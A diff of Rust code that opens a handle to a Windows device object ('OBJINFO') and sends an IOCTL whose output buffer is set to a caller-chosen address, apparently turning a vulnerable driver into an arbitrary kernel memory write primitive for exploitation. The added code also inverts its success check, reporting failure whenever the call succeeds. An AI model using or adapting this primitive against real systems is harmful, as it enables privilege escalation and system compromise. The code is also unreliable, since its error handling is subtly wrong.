@@ -1,7 +1,8 @@
 use std::ffi::CString;
+use std::process;
 use std::ptr::null_mut;
+use std::ptr;
 
-use winapi::ctypes::c_void; // <- use this c_void
 use winapi::shared::ntdef::HANDLE;
 use winapi::um::errhandlingapi::GetLastError;
 use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
@@ -11,7 +12,7 @@ use winapi::um::winnt::{
 };
 use winapi::um::ioapiset::DeviceIoControl;
 
-/// Opens a handle to the device and returns it
+// Opens a handle to the device and returns it
 pub fn get_driver_handle() -> Result<HANDLE, u32> {
     let cstr_device_name =
         CString::new("\\\\.\\GLOBALROOT\\Device\\OBJINFO").expect("CString conversion failed");
@@ -38,27 +39,42 @@ pub fn get_driver_handle() -> Result<HANDLE, u32> {
     }
 }
 
-/// Sends an IOCTL to the driver
-/// `output_buffer` is a raw pointer to the memory you want the driver to write to
+// Sends an IOCTL to the driver
 pub unsafe fn send_ioctl_to_driver(
     h_device: HANDLE,
-    input_value: u64,
-    output_buffer: *mut c_void, // <- must be winapi::ctypes::c_void
+    location_to_write_to: u64,
     size: u32,
-) -> bool {
+) -> i32 {
+    // Check if the handle is valid
+    if h_device == INVALID_HANDLE_VALUE {
+        let err = unsafe { GetLastError() };
+        eprintln!("[!] Error: invalid driver handle. GetLastError = {}", err);
+        process::exit(-1);
+    }
+
+    // Input buffer is just the address you want to write to
+    let input: u64 = location_to_write_to;
     let mut bytes_returned: u32 = 0;
 
-    let success = DeviceIoControl(
-        h_device,
-        0xCF532017,
-        &input_value as *const u64 as *mut c_void, // cast input properly
-        size,
-        output_buffer,
-        size,
-        &mut bytes_returned,
-        null_mut(), // no overlapped
-    );
+    let success = unsafe {
+        DeviceIoControl(
+            h_device,
+            0xCF532017, // IOCTL code
+            &input as *const _ as *mut _, // input buffer
+            size,                          // input buffer size
+            location_to_write_to as *mut _,// output buffer = target memory
+            size,                          // output buffer size
+            &mut bytes_returned,
+            ptr::null_mut(),
+        )
+    };
 
-    success != 0
+    if success != 0 {
+        let err = unsafe { GetLastError() };
+        eprintln!("[-] DeviceIoControl failed. GetLastError = {}", err);
+        return -1;
+    }
+
+    success
 }
 
